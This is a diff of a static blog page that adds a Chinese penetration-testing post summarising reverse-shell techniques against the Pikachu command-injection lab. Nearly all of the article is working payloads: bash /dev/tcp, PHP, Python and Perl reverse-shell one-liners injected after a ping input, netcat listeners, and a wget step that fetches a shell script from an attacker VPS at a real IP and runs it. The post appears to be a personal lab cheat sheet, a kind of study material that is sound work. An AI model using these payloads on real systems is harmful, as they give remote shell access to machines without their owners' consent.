@@ -6,15 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href>
-  <title>Tag: 渗透知识 | Saw,Learnt,To think</title>
+  <title>RCE/命令执行漏洞反弹shell小结 | Saw,Learnt,To think</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Saw,Learnt,To think">
-<meta property="og:url" content="/tags/渗透知识/index.html">
+  <meta name="description" content="0X00 前言 小结一下REC反弹的shell操作, 防止遗忘, 方便查询 环境为[Pikachu漏洞练习平台][https://github.com/zhuifengshaonianhanlu/pikachu]">
+<meta name="keywords" content="渗透小结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE&#x2F;命令执行漏洞反弹shell小结">
+<meta property="og:url" content="/2020/02/28/RCE:命令执行漏洞反弹shell小结/index.html">
 <meta property="og:site_name" content="Saw,Learnt,To think">
+<meta property="og:description" content="0X00 前言 小结一下REC反弹的shell操作, 防止遗忘, 方便查询 环境为[Pikachu漏洞练习平台][https://github.com/zhuifengshaonianhanlu/pikachu]">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="/2020/02/28/RCE:命令执行漏洞反弹shell小结/1.png">
+<meta property="og:image" content="/2020/02/28/RCE:命令执行漏洞反弹shell小结/2.png">
+<meta property="og:image" content="/2020/02/28/RCE:命令执行漏洞反弹shell小结/3.png">
+<meta property="og:image" content="/2020/02/28/RCE:命令执行漏洞反弹shell小结/4.png">
+<meta property="og:updated_time" content="2020-02-28T11:56:12.773Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Saw,Learnt,To think">
+<meta name="twitter:title" content="RCE&#x2F;命令执行漏洞反弹shell小结">
+<meta name="twitter:description" content="0X00 前言 小结一下REC反弹的shell操作, 防止遗忘, 方便查询 环境为[Pikachu漏洞练习平台][https://github.com/zhuifengshaonianhanlu/pikachu]">
+<meta name="twitter:image" content="/2020/02/28/RCE:命令执行漏洞反弹shell小结/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Saw,Learnt,To think" type="application/atom+xml">
   
@@ -142,184 +152,273 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-RCE:命令执行漏洞反弹shell小结" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/24/文件包含与下载/" class="archive-article-date">
-  	<time datetime="2020-02-24T09:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-24</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/24/文件包含与下载/">任意文件读取与下载</a>
+    <h1 class="article-title" itemprop="name">
+      RCE/命令执行漏洞反弹shell小结
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/02/28/RCE:命令执行漏洞反弹shell小结/" class="archive-article-date">
+  	<time datetime="2020-02-28T09:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><ul>
+<li>小结一下REC反弹的shell操作, 防止遗忘, 方便查询</li>
+<li>环境为[Pikachu漏洞练习平台][<a href="https://github.com/zhuifengshaonianhanlu/pikachu]" target="_blank" rel="noopener">https://github.com/zhuifengshaonianhanlu/pikachu]</a></li>
+</ul>
+<a id="more"></a>
+
+
+
+<h3 id="0X01-ping命令反弹shell"><a href="#0X01-ping命令反弹shell" class="headerlink" title="0X01 ping命令反弹shell"></a>0X01 <code>ping</code>命令反弹shell</h3><ul>
+<li><p>方法一: <code>/tmp</code>写入bash反弹</p>
+<ul>
+<li><p>注意,该方法需要<code>bash</code>的权限, 所以在该环境下未成功, 这里仅做记录有这种方法</p>
+</li>
+<li><p>在输入点输入以下写入命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|Echo ‘bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.xxx/8888 0&gt;&amp;1’&gt; /tmp/qqq.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在自己的vps中开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最后在输入点, 控制<code>sh</code>脚本执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|bash /tmp/qqq.sh</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>方法二: php反弹shell</p>
+<ul>
+<li><p>先在自己的vps上开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在输入点, 执行payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|php -r &apos;$sock=fsockopen(&quot;47.93.246.162&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/28/RCE:命令执行漏洞反弹shell小结/1.png" alt="1"></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>方法三:  python反弹shell</p>
+<ul>
+<li><p>vps上先开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在输入点, 执行payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.xxx&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/28/RCE:命令执行漏洞反弹shell小结/2.png" alt="2"></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>方法四: perl反弹shell</p>
+<ul>
+<li><p>vps开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>输入点执行payload (基于/bin/sh)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|perl -e &apos;use Socket;$i=&quot;47.93.246.162&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/28/RCE:命令执行漏洞反弹shell小结/3.png" alt="3"></p>
+</li>
+<li><p>或者payload2(不基于/bin/sh)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;47.93.246.162:8888&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/28/RCE:命令执行漏洞反弹shell小结/4.png" alt="4"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="0X02-“eval”命令"><a href="#0X02-“eval”命令" class="headerlink" title="0X02 “eval”命令"></a>0X02 “eval”命令</h3><ul>
+<li><p>在自己的vps上写一个反弹shell的sh脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/47.93.246.162/8888 0&gt;&amp;1&quot; &gt; sanlorewalker.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在vps开启python简单http服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在输入点, 输入获取sh脚本命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;wget -P /tmp/ http://47.93.246.162:8888/sanlorewalker.sh&apos;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>再输入点, 输入执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;bash /tmp/sanlorewalker.sh&apos;);</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃辣条<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/weixinpay.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透知识</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透小结</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/23/xxe-lab靶场练习/" class="archive-article-date">
-  	<time datetime="2020-02-23T02:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/23/xxe-lab靶场练习/">xxe-lab靶场练习专题</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透知识</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/17/XSS联系/" class="archive-article-date">
-  	<time datetime="2020-02-17T02:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/17/XSS联系/">XSS漏洞练习与正则练习</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透知识</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
       
-        </div></section>
+
       
+
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/30/序列化漏洞/" class="archive-article-date">
-  	<time datetime="2019-10-30T15:22:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/30/序列化漏洞/">序列化漏洞</a>
-    </h1>
-  
+      </div>
+    </span>
+  </div>
+</div>
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透知识</a>
-        		</li>
-      		
-		</ul>
-	</div>
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http:/2020/02/28/RCE:命令执行漏洞反弹shell小结/" alt="微信分享二维码">
+    </div>
+</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2020/02/28/公网攻击机设置/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          公网攻击机设置
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2020/02/28/PHP反序列化和敏感信息泄露/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PHP反序列化和敏感信息泄露</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -344,9 +443,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
@@ -418,7 +517,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Pikachu靶机系列</a>
+                <a href="javascript:void(0)" class="js-tag color4">Docker容器</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -426,7 +525,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Docker容器</a>
+                <a href="javascript:void(0)" class="js-tag color2">Pikachu靶机系列</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -446,11 +545,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web网站</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透小结</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
+                <a href="javascript:void(0)" class="js-tag color1">Web网站</a>
               </li>
              
               <li class="article-tag-list-item">
